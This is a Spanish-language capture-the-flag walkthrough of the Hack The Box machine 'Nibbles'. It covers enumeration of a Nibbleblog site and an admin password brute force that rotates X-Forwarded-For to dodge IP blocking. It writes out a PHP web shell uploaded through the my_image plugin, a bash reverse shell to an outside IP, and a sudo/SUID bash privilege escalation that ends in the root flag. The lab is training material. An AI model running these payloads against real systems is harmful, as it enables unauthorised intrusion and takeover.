10.10.10.75 Nibbles
--------------------

Tras un escaneo con el nmap damos con los puertos 22 (ssh) y 80 (http)
La version de ssh es OpenSSH 7.2p2 (desactualizada, ahora estamos en la 9.0 a fecha de Octubre/2022 )

```console
└─$ whatweb http://10.10.10.75
http://10.10.10.75 [200 OK] Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]
```
O sea que tenemos una web en php. La pagina nos devuelve la frase "Hello World" pero en el codigo fuente nos
dan la ruta /nibbleblog. Este tiene mas cosas, la ruta "/nibbleblog/feed.php", "/nibbleblog/index.php"
"/nibbleblog/admin/js/jquery/jquery.js"

- **"/nibbleblog/feed.php"** -> XML "Nibbles Yum Yum"
- **"/admin"** -> Ruta con todo el codigo fuente. Tiene demasidas cosas. Asi que lo descargare todo.

```console
└─$ wget -m http://10.10.10.75/nibbleblog/admin/
```
Hice una busqueda recursiva de posibles contraseñas pero no halle nada interesante
```console
└─$ grep -rIE "password|pass|key";
```

Resulta que nibbleblog no es un invento de hacktehbox sino que es un CMS de creacion de blogs. Encima tenemos 
todo su codigo fuente descargado (una seccion /admin no deberia ser accesible al publico :V)

Tras una busqueda en **searchsploi** damos con que tenemos sqli tanto en //index.php?page=[SQLi] 
como en /post.php?idpost=[SQLi] pero tras una prueba no funciona.

```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ
000000061:   301        9 L      28 W       323 Ch      "content"
000000245:   301        9 L      28 W       321 Ch      "admin"
000000505:   301        9 L      28 W       323 Ch      "plugins"
```
En **/content** tenemos /private con muchos php (ilegibles porque los interpreta directamente) y xmls 
(en users.xml y config.xml confirman que existe el usaurio *"admin"*) el resto de carpetas de /content no tienen 
nada.
En /plugins salen todos los plugins instalados, tras una busqueda en google di con que el "my_image" es 
vulnerable. Aun asi segui enumerando.

```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ.php
000000001:   200        60 L     168 W      2985 Ch     "index"
000000245:   200        26 L     96 W       1401 Ch     "admin"
000000701:   200        0 L      11 W       78 Ch       "install"
000000780:   200        87 L     174 W      1621 Ch     "update"
000000029:   200        10 L     13 W       401 Ch      "sitemap"
000000112:   200        7 L      15 W       300 Ch      "feed"
```
/admin me pide creds. Tanto install como update no me interesan

La peticion es esto ```username=admin&password=123``` Me baje este [script](https://eightytwo.net/blog/brute-forcing-the-admin-password-on-nibbles/) para enumerar con el rockyuu. La contraseña al final (intento nº 2500 era
RATE_LIMIT_ERROR = 'Blacklist protection'
"nibbles"). El script, cambia la cabecera "X-Fordwarded-For" (indica nuestra IP) dandole una IP aleatoria
cada pocos intentos y que no nos bloqueen.

Una vez entrado en el panel de administración hay una seccion para configurar los plugins. Entre todos está
el "my_image" de antes. En searchsploit hay un script que tira de metasploit, no esta permitido usarse pero
si se puede analizar el script para hacerlo manualmente.

En my_image se puede subir un archivo, probe a subir un shell.php (backdoor en php) y pese a que salieran 
mensajes de error, funcionó sinr estricciones

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Tras una busuqeda di con la ruta del [plugin](https://vuldb.com/?id.77730) 
```http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami # -> nibbleblog```
El comando a pasarle es este (los & estan urlencodeados a %26)
```bash -c 'bash -i >%26 /dev/tcp/10.10.14.10/443 0>%261'```

Escucha con netcat y tratamiento de la tty ```sudo nc -nlvp 443```

```
script /dev/null -c bash 
ctrolZ
stty raw -echo; fg
reset xterm
<ml/nibbleblog/content/private/plugins/my_image$ stty rows 33 columns 118
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ export TERM=xterm
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ export SHELL=/bin/bash
```

Bajo un reconocimiento con mi [script]() encontre cosas raras:
- CLiente sql activo (puerto 3306) -> da ACCES DENIED,
- carpeta /home -> user.txt (flag), personal.zip (archivo, no se que es)
- Tambien tiene backups de "gshadow" "passwd" y "shadow" bajo la carpeta /var/backups
- Binario ejecutable por root sin contraseña! (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

El /personal.zip tiene el script mencionado antes "monitor.sh"

```console
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh 
```

El script es largo, al principio pone:
```Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/```

El tema no va de descrifrar el script, da igual lo que haya, el asunto esque si se puede ejecutar como root
sin contraseña una cosa que permita darle comandos al sistema la tenemos liada. Han metido un script complicado
para despistar.
Se puede añadir la linea esta al principio (despues del "#!/bin/bash" ) -> ```chmod u+s /bin/bash```
Lo que hace es convertir la shell (/bin/bash) en un binario SUID (que se peuda ejecutar como root durante un 
tiempo). Si se le pasa el comando -p se hace que sea permanente.

```console
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -u root ./monitor.sh # ejecutarlo como root 
nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p
bash-4.3# whoami
root
bash-4.3# cd /root
bash-4.3# cat root.txt
728bc9945883952ac8cea0ff12e9b4f3
```



